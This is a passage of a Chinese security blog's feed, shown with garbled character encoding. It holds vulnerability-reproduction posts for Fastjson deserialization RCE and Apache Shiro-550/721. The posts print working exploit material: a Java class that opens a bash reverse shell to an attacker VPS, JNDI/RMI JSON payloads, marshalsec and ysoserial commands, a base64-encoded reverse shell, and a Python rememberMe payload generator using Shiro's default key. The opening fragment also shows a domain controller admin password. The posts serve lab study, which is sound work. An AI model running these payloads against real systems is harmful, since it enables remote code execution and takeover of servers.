&lt;p&gt;win2008 åŸŸæ§       æœ¬åœ°ç®¡ç†å‘˜å¯†ç :0801.com  åŸŸ</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="å†…ç½‘" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91/"/>
    
    
    <category term="å†…ç½‘" scheme="https://sakurahack-y.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>Fastjsonæ¼æ´å¤ç°</title>
    <link href="https://sakurahack-y.github.io/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-16T09:39:56.000Z</published>
    <updated>2022-03-16T17:49:45.638Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p><a href="https://so.csdn.net/so/search?q=Fastjson&spm=1001.2101.3001.7020">Fastjson</a>æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚å…·æœ‰æ‰§è¡Œæ•ˆç‡é«˜çš„ç‰¹ç‚¹ï¼Œåº”ç”¨èŒƒå›´å¹¿æ³›ã€‚</p><h1 id="fastjsonæŒ‡çº¹è¯†åˆ«"><a href="#fastjsonæŒ‡çº¹è¯†åˆ«" class="headerlink" title="fastjsonæŒ‡çº¹è¯†åˆ«"></a>fastjsonæŒ‡çº¹è¯†åˆ«</h1><p>å½“æˆ‘ä»¬åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼ŒæŠ“åŒ…çš„æ—¶å€™å‘ç°è¿”å›çš„æµé‡å†…å®¹å­˜åœ¨jsonæ ¼å¼æ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æƒ³å®ƒæ˜¯ä¸æ˜¯ä½¿ç”¨äº†fastjsonåº“</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>æ¥ç€æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥è¿›è¡Œåˆ¤æ–­</p><ol><li>æ ¹æ®æŠ¥é”™ä¿¡æ¯åˆ¤æ–­</li></ol><p>å‘é€ä¸€ä¸ªpostè¯·æ±‚ã€‚å‘é€çš„æ•°æ®ä¸ºæ²¡é—­åˆçš„èŠ±æ‹¬å·ï¼Œå¦‚æœæœåŠ¡å™¨æ²¡æœ‰å±è”½é”™è¯¯ä¿¡æ¯åˆ™ä¼šæŠ¥å‡ºfastjsonçš„ä¿¡æ¯ã€‚å¦‚æœå±è”½äº†æŠ¥é”™ä¿¡æ¯è¯·çœ‹ç¬¬äºŒæ¡</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><ol start="2"><li>åˆ©ç”¨dnslogç›²æ‰“</li></ol><p>å¯¹ç›®æ ‡å‘é€ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œè¯·æ±‚ä½“å†…å®¹å¦‚ä¸‹ã€‚è¯·æ±‚å¤´æ·»åŠ Content-Type: application/json</p><pre><code>&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125; </code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>DNSlogåˆ·æ–°æˆåŠŸ</p><h1 id="Fastjson-lt-1-2-24è¿œç¨‹ä»£ç æ‰§è¡Œ-CVE-2017-18349"><a href="#Fastjson-lt-1-2-24è¿œç¨‹ä»£ç æ‰§è¡Œ-CVE-2017-18349" class="headerlink" title="Fastjson&lt;1.2.24è¿œç¨‹ä»£ç æ‰§è¡Œ(CVE-2017-18349)"></a>Fastjson&lt;1.2.24è¿œç¨‹ä»£ç æ‰§è¡Œ(CVE-2017-18349)</h1><p><strong>æ¼æ´è¯¦æƒ…</strong></p><p>fastjsonåœ¨è§£æjsonçš„è¿‡ç¨‹ä¸­ï¼Œæ”¯æŒä½¿ç”¨autoTypeæ¥å®ä¾‹åŒ–æŸä¸€ä¸ªå…·ä½“çš„ç±»ï¼Œå¹¶è°ƒç”¨è¯¥ç±»çš„set/getæ–¹æ³•æ¥è®¿é—®å±æ€§ã€‚é€šè¿‡æŸ¥æ‰¾ä»£ç ä¸­ç›¸å…³çš„æ–¹æ³•ï¼Œå³å¯æ„é€ å‡ºä¸€äº›æ¶æ„åˆ©ç”¨é“¾ã€‚</p><p><strong>æ¼æ´ç‰ˆæœ¬</strong></p><p>fastjson &lt;=1.2.24</p><p><strong>æ¼æ´åˆ†æ</strong></p><p><a href="http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/</a></p><p><strong>éœ€è¦ç¯å¢ƒ</strong></p><p>åœ¨æœ¬æœºæå‰å®‰è£…å¥½mavenå’Œjdk</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235940219.png" alt="image-20220316235940219"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000000186.png" alt="image-20220317000000186"></p><p><strong>æ¼æ´å¤ç°</strong></p><p>ä½¿ç”¨vulhubæ­å»ºæ¼æ´ç¯å¢ƒ</p><pre><code class="text">docker-compose up d</code></pre><p>è®¿é—®xxx:8090</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220316235812389.png" alt="image-20220316235812389"></p><p>ä¿å­˜ä»¥ä¸‹ä»£ç </p><p>dnslog.java</p><pre><code class="java">import java.io.BufferedReader;import java.io.InputStream;import java.io.InputStreamReader; public class Exploit&#123;    public Exploit() throws Exception &#123;        Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/VPSçš„IP/6666 0&gt;&amp;1&quot;&#125;);        InputStream is = p.getInputStream();        BufferedReader reader = new BufferedReader(new InputStreamReader(is));         String line;        while((line = reader.readLine()) != null) &#123;            System.out.println(line);        &#125;         p.waitFor();        is.close();        reader.close();        p.destroy();    &#125;     public static void main(String[] args) throws Exception &#123;    &#125;&#125;</code></pre><p>ç¼–è¯‘ä¸ºExploit.class</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>ä½¿ç”¨pythonåœ¨å½“å‰ç›®å½•ä¸‹èµ·ä¸€ä¸ªhttpæœåŠ¡ï¼Œå¦‚æœç«¯å£å ç”¨æ¢å…¶ä»–çš„</p><pre><code class="text">python -m SimpleHTTPServer 4567</code></pre><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317000648363.png" alt="image-20220317000648363"></p><p>ä½¿ç”¨marshalsecé¡¹ç›®ï¼Œå¯åŠ¨RMIæœåŠ¡ï¼Œç›‘å¬9999ç«¯å£å¹¶åŠ è½½è¿œç¨‹ç±»Exploit.class</p><pre><code class="text">git clone https://github.com/mbechler/marshalsec.gitcd marshalsec/ç¼–è¯‘é¡¹ç›®mvn clean package -DskipTests</code></pre><p>ä»¥æˆ‘æ­å»ºExploit.classç±»httpæœåŠ¡çš„æœåŠ¡å™¨IPä¸º2.2.2.2ç«¯å£ä¸º4567</p><pre><code class="text">cd target/java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://xxx:4567/#Exploit&quot; 9999</code></pre><p>RMIæœåŠ¡å¯ä»¥æ­å»ºåœ¨ä¸Exploit.classç±»çš„httpæœåŠ¡åŒä¸€å°æœåŠ¡å™¨ï¼Œä¹Ÿå¯ä»¥æ­å»ºåœ¨å…¶å®ƒæœåŠ¡å™¨ä¸Šã€‚æˆ‘ä»¬æ¼”ç¤ºè¿˜æ˜¯åœ¨åŒä¸€å°ã€‚</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>ç¯å¢ƒå·²ç»æ­å»ºå¥½ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨burpå¼€å§‹</p><pre><code class="text">POST / HTTP/1.1Accept: */*Accept-Language: zh-CNUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729; NMTE)Host: ç›®æ ‡ip:8090Connection: closeContent-Length: 162Content-Type: application/jsonAccept-Encoding: gzip, deflate&#123;    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://vpsçš„ip:9999/Exploit&quot;,        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre><p>å¦‚å›¾å³ä»£è¡¨æ”»å‡»æˆåŠŸ</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317012518646.png" alt="image-20220317012518646"></p><p>RMIæœåŠ¡å“åº”</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013058412.png" alt="image-20220317013058412"></p><p>pythonæ­å»ºçš„httpæœåŠ¡å“åº”</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013143699.png" alt="image-20220317013143699"></p><p>nc</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013212099.png" alt="image-20220317013212099"></p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317013225316.png" alt="image-20220317013225316"></p><h1 id="Fastjson-1-2-47-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"><a href="#Fastjson-1-2-47-è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´" class="headerlink" title="Fastjson 1.2.47 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´"></a>Fastjson 1.2.47 è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´</h1><p>å’Œfastjson1.2.24å·®ä¸å¤šï¼Œå°±æ˜¯pocä¸ä¸€æ ·è€Œå·²</p><p><strong>å½±å“ç‰ˆæœ¬</strong></p><ul><li>fastjson&lt;=1.2.47</li></ul><p><strong>æ¼æ´æ£€æµ‹</strong></p><p>æ£€æµ‹æ–¹å¼å’Œ1.2.24ä¸€æ ·</p><p>æ¼æ´åˆ©ç”¨</p><p>åˆ›å»ºæ¶æ„ç±»ï¼Œpythonæ­å»ºæœåŠ¡</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317010125235.png" alt="image-20220317010125235"></p><p>æ­å»ºRMIæœåŠ¡</p><p><img src="/2022/03/16/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220317001425835.png" alt="image-20220317001425835"></p><p>å‘é€çš„æ•°æ®åŒ…æ”¹ä¸ºå³å¯</p><pre><code class="text">POST / HTTP/1.1Host: 192.168.140.158:8090   #é¶æœºåœ°å€Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 263 &#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;    &#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;rmi://VPSåœ°å€:ç«¯å£/Exploit&quot;,  #è¿™é‡Œçš„Exploitä¸èƒ½å˜        &quot;autoCommit&quot;:true    &#125;&#125;</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://so.csdn.net/so/search?q=Fastjson&amp;spm=1001.2101.3001.7</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="fastjson" scheme="https://sakurahack-y.github.io/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>shiroæ¼æ´å¤ç°</title>
    <link href="https://sakurahack-y.github.io/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://sakurahack-y.github.io/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2022-03-15T09:11:24.000Z</published>
    <updated>2022-03-15T12:30:46.449Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œæä¾›äº†è®¤è¯ã€æˆæƒã€åŠ å¯†å’Œä¼šè¯ç®¡ç†ç­‰åŠŸèƒ½ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®çš„å®‰å…¨æ€§ã€‚</p><h1 id="Shiro-rememberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰"><a href="#Shiro-rememberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰" class="headerlink" title="Shiro rememberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰"></a>Shiro rememberMeååºåˆ—åŒ–æ¼æ´ï¼ˆShiro-550ï¼‰</h1><p><strong>å½±å“ç‰ˆæœ¬:Apache Shiro &lt; 1.2.4</strong></p><p><strong>æ¼æ´åŸç†ï¼š</strong>Apache Shiroæ¡†æ¶æä¾›äº†è®°ä½å¯†ç çš„åŠŸèƒ½ï¼ˆRememberMeï¼‰ï¼Œç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆç»è¿‡åŠ å¯†å¹¶ç¼–ç çš„cookieã€‚åœ¨æœåŠ¡ç«¯å¯¹rememberMeçš„cookieå€¼ï¼Œå…ˆbase64è§£ç ç„¶åAESè§£å¯†å†ååºåˆ—åŒ–ï¼Œå°±å¯¼è‡´äº†ååºåˆ—åŒ–RCEæ¼æ´ã€‚é‚£ä¹ˆï¼ŒPayloadäº§ç”Ÿçš„è¿‡ç¨‹ï¼š<br>å‘½ä»¤=&gt;åºåˆ—åŒ–=&gt;AESåŠ å¯†=&gt;base64ç¼–ç =&gt;RememberMe Cookieå€¼<br>åœ¨æ•´ä¸ªæ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­ï¼Œæ¯”è¾ƒé‡è¦çš„æ˜¯AESåŠ å¯†çš„å¯†é’¥ï¼Œå¦‚æœæ²¡æœ‰ä¿®æ”¹é»˜è®¤çš„å¯†é’¥é‚£ä¹ˆå°±å¾ˆå®¹æ˜“å°±çŸ¥é“å¯†é’¥äº†,Payloadæ„é€ èµ·æ¥ä¹Ÿæ˜¯ååˆ†çš„ç®€å•ã€‚</p><p><strong>ç‰¹å¾åˆ¤æ–­</strong></p><p>è¿”å›åŒ…ä¸­åŒ…å«rememberMe=deleteMeå­—æ®µã€‚</p><p><strong>ç¯å¢ƒæ­å»º</strong></p><pre><code class="text">è·å–dockeré•œåƒdocker pull medicean/vulapps:s_shiro_1å¯åŠ¨dockeré•œåƒï¼šdocker run -d -p 8080:8080 medicean/vulapps:s_shiro_1</code></pre><p><strong>å·¥å…·å‡†å¤‡</strong></p><p>mavené…ç½®:</p><pre><code class="text">sudo wget  https://mirrors.tuna.tsinghua.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gztar -zxvf apache-maven-3.6.3-bin.tar.gzsudo mv apache-maven-3.6.3 /usr/local/maven3åœ¨/etc/profileæœ«å°¾æ·»åŠ mavenç¯å¢ƒå˜é‡:export M2_HOME=/usr/local/maven3export PATH=$PATH:$JAVA_HOME/bin:$M2_HOME/binsource /etc/profile</code></pre><p>ä¸‹è½½ysoserialå¹¶æ‰“åŒ…:</p><pre><code class="text">git clone https://github.com/frohoff/ysoserial.gitcd ysoserialmvn package -D skipTests</code></pre><p>ç”Ÿæˆçš„å·¥å…·åœ¨ysoserial/targetæ–‡ä»¶ä¸­ã€‚</p><p><strong>å¤ç°æµç¨‹</strong></p><p><strong>1ã€æ£€æŸ¥æ˜¯å¦å­˜åœ¨é»˜è®¤çš„key</strong></p><p>æ¨èä½¿ç”¨Shiro_exploitæ£€æµ‹:<a href="https://github.com/insightglacier/Shiro_exploit">https://github.com/insightglacier/Shiro_exploit</a></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181209641.png" alt="image-20220315181209641"></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181335231.png" alt="image-20220315181335231"></p><p>å¦‚å›¾æˆåŠŸè·å–å¯†é’¥</p><p><strong>2ã€ncç›‘å¬æœ¬åœ°ç«¯å£</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315181502656.png" alt="image-20220315181502656"></p><p><strong>3ã€ç¼–å†™åå¼¹shellä»£ç </strong></p><pre><code class="text">bash -i &gt;&amp; /dev/tcp/192.168.172.133/1234 0&gt;&amp;1#è¿›è¡Œbase64ç¼–ç bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></pre><p><strong>4ã€é€šè¿‡ysoserialä¸­JRMPç›‘å¬æ¨¡å—ï¼Œç›‘å¬5555ç«¯å£å¹¶æ‰§è¡Œåå¼¹shellå‘½ä»¤ã€‚</strong></p><pre><code class="text">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 5555 CommonsCollections4 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315185158472.png" alt="image-20220315185158472"></p><p><strong>5ã€ä½¿ç”¨shiro.pyç”Ÿæˆpayload</strong></p><pre><code class="text">import sysimport uuidimport base64import subprocessfrom Crypto.Cipher import AESdef encode_rememberme(command):    popen = subprocess.Popen([&#39;java&#39;, &#39;-jar&#39;, &#39;ysoserial-0.0.6-SNAPSHOT-all.jar&#39;, &#39;JRMPClient&#39;, command], stdout=subprocess.PIPE)    BS = AES.block_size    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()    key = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)    iv = uuid.uuid4().bytes    encryptor = AES.new(key, AES.MODE_CBC, iv)    file_body = pad(popen.stdout.read())    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))    return base64_ciphertextif __name__ == &#39;__main__&#39;:    payload = encode_rememberme(sys.argv[1])   print &quot;rememberMe=&#123;0&#125;&quot;.format(payload.decode())</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315192829289.png" alt="image-20220315192829289"></p><p>ps:æ³¨æ„shiro.pyè¦åœ¨targetç›®å½•ä¸‹</p><p><strong>6ã€æ„é€ æ•°æ®åŒ…ï¼Œä¼ªé€ cookieï¼Œå‘é€Payload</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200340397.png" alt="image-20220315200340397"></p><p>ç”¨ä¸Šæ–‡äº§ç”Ÿçš„payloadè¿›è¡Œæ›¿æ¢</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200402486.png" alt="image-20220315200402486"></p><p>å‘é€</p><p><strong>7ã€æˆåŠŸåå¼¹shell</strong></p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20220315200453881.png" alt="image-20220315200453881"></p><h1 id="Shiro-Padding-Oracle-Attackï¼ˆShiro-721ï¼‰"><a href="#Shiro-Padding-Oracle-Attackï¼ˆShiro-721ï¼‰" class="headerlink" title="Shiro Padding Oracle Attackï¼ˆShiro-721ï¼‰"></a>Shiro Padding Oracle Attackï¼ˆShiro-721ï¼‰</h1><p><strong>æ¼æ´åŸç†</strong></p><p>ç”±äºApache Shiro cookieä¸­é€šè¿‡ AES-128-CBC æ¨¡å¼åŠ å¯†çš„rememberMeå­—æ®µå­˜åœ¨é—®é¢˜ï¼Œç”¨æˆ·å¯é€šè¿‡Padding  Oracle åŠ å¯†ç”Ÿæˆçš„æ”»å‡»ä»£ç æ¥æ„é€ æ¶æ„çš„rememberMeå­—æ®µï¼Œå¹¶é‡æ–°è¯·æ±‚ç½‘ç«™ï¼Œè¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼Œæœ€ç»ˆå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚<br>å½±å“ç‰ˆæœ¬ï¼šApache Shiro &lt; 1.4.2ç‰ˆæœ¬ã€‚</p><p><strong>æ¼æ´åˆ©ç”¨ï¼š</strong><br>1ã€ç™»å½•Shiroç½‘ç«™ï¼Œä»cookieä¸­è·å¾—rememberMeå­—æ®µçš„å€¼ã€‚</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113116568-425378550.png" alt="img"><br>2ã€åˆ©ç”¨DNSlogæ¢æµ‹ï¼Œé€šè¿‡ysoserialå·¥å…·payloadã€‚</p><pre><code class="text">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class</code></pre><p>3ã€ä½¿ç”¨rememberMeå€¼ä½œä¸ºprefixï¼ŒåŠ è½½Payloadï¼Œè¿›è¡ŒPadding Oracleæ”»å‡»ã€‚<br>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">https://github.com/longofo/PaddingOracleAttack-Shiro-721</a><br>ä½¿ç”¨ç¤ºä¾‹ï¼š</p><pre><code class="text">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</code></pre><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113145995-1951867126.png" alt="img"><br>çˆ†ç ´æˆåŠŸï¼Œè¾“å‡ºResultï¼š</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113200234-980599342.png" alt="img"></p><p>4ã€ä½¿ç”¨æ„é€ çš„rememberMeæ”»å‡»å­—ç¬¦ä¸²é‡æ–°è¯·æ±‚ç½‘ç«™<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113217346-911399190.png" alt="img"></p><p>5ã€æˆåŠŸè§¦å‘Payloadï¼Œåœ¨DNSLogè·å–åˆ°ç›®æ ‡IPã€‚<img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113226312-979603878.png" alt="img"></p><h1 id="ä¸€é”®è‡ªåŠ¨åŒ–æ¼æ´åˆ©ç”¨å·¥å…·"><a href="#ä¸€é”®è‡ªåŠ¨åŒ–æ¼æ´åˆ©ç”¨å·¥å…·" class="headerlink" title="ä¸€é”®è‡ªåŠ¨åŒ–æ¼æ´åˆ©ç”¨å·¥å…·"></a>ä¸€é”®è‡ªåŠ¨åŒ–æ¼æ´åˆ©ç”¨å·¥å…·</h1><p>ShiroExploitï¼šæ”¯æŒå¯¹Shiro-550ï¼ˆç¡¬ç¼–ç ç§˜é’¥ï¼‰å’ŒShiro-721ï¼ˆPadding Oracleï¼‰çš„ä¸€é”®åŒ–æ£€æµ‹ï¼Œæ”¯æŒç®€å•å›æ˜¾ã€‚<br>Githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/feihong-cs/ShiroExploit">https://github.com/feihong-cs/ShiroExploit</a></p><p>Shiro-550ï¼Œåªéœ€è¾“å…¥urlï¼Œå³å¯å®Œæˆè‡ªåŠ¨åŒ–æ£€æµ‹å’Œæ¼æ´åˆ©ç”¨ã€‚</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113422921-1885042148.png" alt="img"></p><p>Shiro-721ï¼Œéœ€è¾“å…¥urlï¼Œæä¾›ä¸€ä¸ªæœ‰æ•ˆçš„rememberMe Cookieï¼Œå¹¶æŒ‡å®šç›®æ ‡æ“ä½œç³»ç»Ÿç±»å‹ã€‚</p><p><img src="/2022/03/15/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/894761-20200705113437704-589381400.png" alt="img"></p><p>å‚è€ƒé“¾æ¥:<a href="https://www.cnblogs.com/xiaozi/p/13239046.html">https://www.cnblogs.com/xiaozi/p/13239046.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h1&gt;&lt;p&gt;Apache Shiroæ˜¯ä¸€ä¸ªå¼ºå¤§æ˜“ç”¨çš„Javaå®‰å…¨æ¡†æ¶ï¼Œæä¾›äº†è®¤è¯ã€æˆæƒã€åŠ å¯†å’Œä¼šè¯ç®¡ç†ç­‰åŠŸèƒ½ã€‚Shiroæ¡†æ¶ç›´è§‚ã€æ˜“ç”¨ï¼ŒåŒæ—¶ä¹Ÿèƒ½æä¾›å¥å£®</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="æ¼æ´å¤ç°" scheme="https://sakurahack-y.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="shrio" scheme="https://sakurahack-y.github.io/tags/shrio/"/>
    
  </entry>
  
  <entry>
    <title>windowsææƒæ€»ç»“</title>
